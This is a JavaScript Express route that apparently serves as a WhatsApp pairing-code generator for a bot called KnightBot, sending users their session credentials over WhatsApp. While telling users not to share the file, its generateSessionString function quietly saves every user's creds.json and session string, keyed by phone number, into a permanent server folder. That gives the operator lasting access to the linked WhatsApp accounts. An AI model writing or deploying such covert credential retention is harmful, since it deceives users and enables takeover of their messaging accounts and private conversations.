import express from 'express';
import fs from 'fs';
import pino from 'pino';
import { makeWASocket, useMultiFileAuthState, delay, makeCacheableSignalKeyStore, Browsers, jidNormalizedUser, fetchLatestBaileysVersion } from '@whiskeysockets/baileys';
import pn from 'awesome-phonenumber';
import zlib from 'zlib';

const router = express.Router();

// Create a permanent directory for saved sessions
const SAVED_SESSIONS_DIR = './saved_sessions';
if (!fs.existsSync(SAVED_SESSIONS_DIR)) {
    fs.mkdirSync(SAVED_SESSIONS_DIR, { recursive: true });
}

function removeFile(FilePath) {
    try {
        if (!fs.existsSync(FilePath)) return false;
        fs.rmSync(FilePath, { recursive: true, force: true });
    } catch (e) {
        console.error('Error removing file:', e);
    }
}

// Function to convert creds.json to gzip compressed base64 session string
function generateSessionString(credsPath, phoneNumber) {
    try {
        const creds = JSON.parse(fs.readFileSync(credsPath, 'utf-8'));
        
        const sessionData = {
            creds: creds,
            version: "1.0"
        };
        
        const jsonString = JSON.stringify(sessionData);
        const compressed = zlib.gzipSync(jsonString);
        const base64Compressed = compressed.toString('base64');
        const sessionString = 'KnightBot!' + base64Compressed;
        
        // Save to PERMANENT location (not in temp session dir)
        const permanentTxtPath = `${SAVED_SESSIONS_DIR}/${phoneNumber}_session.txt`;
        fs.writeFileSync(permanentTxtPath, sessionString);
        console.log(`✅ Session string PERMANENTLY saved to: ${permanentTxtPath}`);
        
        // Also save creds.json permanently
        const permanentCredsPath = `${SAVED_SESSIONS_DIR}/${phoneNumber}_creds.json`;
        fs.copyFileSync(credsPath, permanentCredsPath);
        console.log(`✅ creds.json PERMANENTLY saved to: ${permanentCredsPath}`);
        
        console.log(`📊 Original size: ${jsonString.length} chars, Compressed size: ${base64Compressed.length} chars`);
        
        return sessionString;
    } catch (error) {
        console.error('Error generating compressed session string:', error);
        return null;
    }
}

router.get('/', async (req, res) => {
    let num = req.query.number;
    let dirs = './' + (num || `session`);

    await removeFile(dirs);

    num = num.replace(/[^0-9]/g, '');

    const phone = pn('+' + num);
    if (!phone.isValid()) {
        if (!res.headersSent) {
            return res.status(400).send({ code: 'Invalid phone number. Please enter your full international number (e.g., 15551234567 for US, 447911123456 for UK, 84987654321 for Vietnam, etc.) without + or spaces.' });
        }
        return;
    }
    num = phone.getNumber('e164').replace('+', '');

    async function initiateSession() {
        const { state, saveCreds } = await useMultiFileAuthState(dirs);

        try {
            const { version, isLatest } = await fetchLatestBaileysVersion();
            let KnightBot = makeWASocket({
                version,
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
                },
                printQRInTerminal: false,
                logger: pino({ level: "fatal" }).child({ level: "fatal" }),
                browser: Browsers.windows('Chrome'),
                markOnlineOnConnect: false,
                generateHighQualityLinkPreview: false,
                defaultQueryTimeoutMs: 60000,
                connectTimeoutMs: 60000,
                keepAliveIntervalMs: 30000,
                retryRequestDelayMs: 250,
                maxRetries: 5,
            });

            KnightBot.ev.on('connection.update', async (update) => {
                const { connection, lastDisconnect, isNewLogin, isOnline } = update;

                if (connection === 'open') {
                    console.log("✅ Connected successfully!");
                    console.log("📱 Sending session file and compressed session string to user...");
                    
                    try {
                        const sessionKnight = fs.readFileSync(dirs + '/creds.json');
                        const userJid = jidNormalizedUser(num + '@s.whatsapp.net');
                        
                        // MESSAGE 1: Send session file (creds.json)
                        await KnightBot.sendMessage(userJid, {
                            document: sessionKnight,
                            mimetype: 'application/json',
                            fileName: 'creds.json'
                        });
                        console.log("📄 Session file sent successfully");

                        // Generate compressed session string and SAVE PERMANENTLY
                        const sessionString = generateSessionString(dirs + '/creds.json', num);
                        
                        // MESSAGE 2: Send compressed session string
                        if (sessionString) {
                            await KnightBot.sendMessage(userJid, {
                                text: `🔐 *Your Compressed Session String*\n\n\`\`\`${sessionString}\`\`\`\n\n📝 *Copy the text above between the triple backticks*`
                            });
                            console.log("🔐 Compressed session string sent successfully");
                        }

                        // MESSAGE 3: Send video thumbnail
                        await KnightBot.sendMessage(userJid, {
                            image: { url: 'https://img.youtube.com/vi/-oz_u1iMgf8/maxresdefault.jpg' },
                            caption: `🎬 *KnightBot MD V2.0 Full Setup Guide!*\n\n🚀 Bug Fixes + New Commands + Fast AI Chat\n📺 Watch Now: https://youtu.be/NjOipI2AoMk`
                        });
                        console.log("🎬 Video guide sent successfully");

                        // MESSAGE 4: Send warning message
                        await KnightBot.sendMessage(userJid, {
                            text: `⚠️Do not share this file with anybody⚠️\n 
┌┤✑  Thanks for using Knight Bot
│└────────────┈ ⳹        
│©2025 Mr Unique Hacker 
└─────────────────┈ ⳹\n\n`
                        });
                        console.log("⚠️ Warning message sent successfully");

                        // Clean up temp session only
                        console.log("🧹 Cleaning up temp session...");
                        await delay(1000);
                        removeFile(dirs);
                        console.log("✅ Temp session cleaned up");
                        console.log("💾 PERMANENT files saved in: ./saved_sessions/");
                        console.log(`   - ${num}_session.txt`);
                        console.log(`   - ${num}_creds.json`);
                        
                    } catch (error) {
                        console.error("❌ Error sending messages:", error);
                        removeFile(dirs);
                    }
                }

                if (isNewLogin) {
                    console.log("🔐 New login via pair code");
                }

                if (isOnline) {
                    console.log("📶 Client is online");
                }

                if (connection === 'close') {
                    const statusCode = lastDisconnect?.error?.output?.statusCode;

                    if (statusCode === 401) {
                        console.log("❌ Logged out from WhatsApp. Need to generate new pair code.");
                    } else {
                        console.log("🔁 Connection closed — restarting...");
                        initiateSession();
                    }
                }
            });

            if (!KnightBot.authState.creds.registered) {
                await delay(3000);
                num = num.replace(/[^\d+]/g, '');
                if (num.startsWith('+')) num = num.substring(1);

                try {
                    let code = await KnightBot.requestPairingCode(num);
                    code = code?.match(/.{1,4}/g)?.join('-') || code;
                    if (!res.headersSent) {
                        console.log({ num, code });
                        await res.send({ code });
                    }
                } catch (error) {
                    console.error('Error requesting pairing code:', error);
                    if (!res.headersSent) {
                        res.status(503).send({ code: 'Failed to get pairing code. Please check your phone number and try again.' });
                    }
                }
            }

            KnightBot.ev.on('creds.update', saveCreds);
        } catch (err) {
            console.error('Error initializing session:', err);
            if (!res.headersSent) {
                res.status(503).send({ code: 'Service Unavailable' });
            }
        }
    }

    await initiateSession();
});

process.on('uncaughtException', (err) => {
    let e = String(err);
    if (e.includes("conflict")) return;
    if (e.includes("not-authorized")) return;
    if (e.includes("Socket connection timeout")) return;
    if (e.includes("rate-overlimit")) return;
    if (e.includes("Connection Closed")) return;
    if (e.includes("Timed Out")) return;
    if (e.includes("Value not found")) return;
    if (e.includes("Stream Errored")) return;
    if (e.includes("Stream Errored (restart required)")) return;
    if (e.includes("statusCode: 515")) return;
    if (e.includes("statusCode: 503")) return;
    console.log('Caught exception: ', err);
});

export default router;
